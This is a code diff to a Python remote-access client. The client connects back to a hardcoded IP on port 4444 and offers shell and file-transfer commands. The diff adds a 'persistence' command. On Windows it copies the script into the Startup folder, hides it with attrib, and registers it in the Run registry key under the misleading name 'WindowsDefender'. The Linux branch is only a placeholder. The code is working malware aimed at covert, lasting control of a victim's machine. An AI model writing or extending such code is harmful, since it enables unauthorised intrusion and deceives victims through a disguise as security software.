@@ -8,11 +8,12 @@ import uuid
 import struct
 import subprocess
 import os
+import winreg
 
 
 IP = "192.168.0.53"
 PORT = 4444
-ARC = platform.system()
+arc = platform.system()
 
 def send(sock, data):
     if isinstance(data, str):
@@ -122,6 +123,34 @@ def handle_shell(sock):
             send(sock, f"Error: {str(e)}\n".encode())
             send(sock, b"END_OF_OUTPUT")
 
+def persistance(sock):
+    try:
+        if arc.lower() == "windows":
+            su_path = os.path.join(
+                os.getenv('APPDATA'),'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+            f_path = os.path.abspath(sys.argv[0])
+            f_name = os.path.basename(f_path)
+            targ_path = os.path.join(su_path, f_name)
+            os.system(f'attrib +h "{targ_path}"')
+            if not os.path.exists(targ_path):
+                    shutil.copy2(f_path, targ_path)
+            if os.path.exists(targ_path):
+                send(sock, b"[+] Windows startup persistence succeeded")
+            
+            reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            try:
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key, 0, winreg.KEY_SET_VALUE)
+                winreg.SetValueEx(key, "WindowsDefender", 0, winreg.REG_SZ, targ_path)
+                winreg.CloseKey(key)
+                send(sock, f"[+] Registry persistence succeeded".encode())
+            except Exception as reg_error:
+                send(sock, f"[!] Registry persistence failed: {reg_error}".encode())
+        elif arc.lower() == "linux":
+            print("linux logic")
+        
+    except Exception as e:
+        send(sock, f"Persistence failed: {e}".encode())
+
 def handle_cmd(sock):
     try:
         while True:
@@ -142,6 +171,8 @@ def handle_cmd(sock):
                 elif cmd.startswith("upload "):
                     path = cmd[len("upload "):].strip()
                     download(sock, path)
+                elif cmd.lower() == "persistence":
+                    persistance(sock)
                     
                 elif cmd.lower() == "kill":
                     kill_connection(sock)
